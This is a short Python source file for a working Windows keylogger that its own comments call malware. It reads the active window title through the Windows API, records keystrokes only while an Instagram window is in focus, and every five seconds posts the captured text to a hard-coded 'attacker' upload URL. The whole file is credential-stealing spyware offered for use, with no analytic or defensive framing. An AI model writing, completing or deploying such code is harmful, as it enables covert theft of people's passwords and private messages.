from pynput import keyboard
import requests
import threading
import ctypes 
from ctypes import wintypes

# ==========================================
# CONFIGURATION
# Put YOUR (Attacker) IP here
ATTACKER_URL = "http://192.168.1.5:5000/upload"
TARGET_APP = "instagram" # The keyword we are hunting for
# ==========================================

captured_keys = ""

# --- WINDOW SNIFFING FUNCTION ---
# This uses Windows API to find out what the user is looking at
def get_active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow() # Get handle of active window
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value.lower() # Return title in lowercase (e.g., "instagram - google chrome")
    except:
        return ""

# --- SEND DATA TO SERVER ---
def send_data():
    global captured_keys
    if len(captured_keys) > 0:
        try:
            payload = {'keys': captured_keys}
            requests.post(ATTACKER_URL, data=payload)
            captured_keys = "" 
        except:
            pass
    # Check again in 5 seconds
    threading.Timer(5, send_data).start()

# --- KEYBOARD LISTENER ---
def on_press(key):
    global captured_keys
    
    # 1. CHECK THE WINDOW
    active_window = get_active_window_title()
    
    # 2. DECIDE: IS THIS INSTAGRAM?
    if TARGET_APP in active_window:
        # Yes! Record the key.
        try:
            captured_keys += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                captured_keys += " "
            elif key == keyboard.Key.enter:
                captured_keys += " [ENTER] "
            elif key == keyboard.Key.backspace:
                captured_keys += " [BACK] "
            else:
                pass # Ignore other special keys to keep log clean
    else:
        # No. The user is on Notepad/Desktop/YouTube. Do NOT record.
        pass

# Start the malware
send_data()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
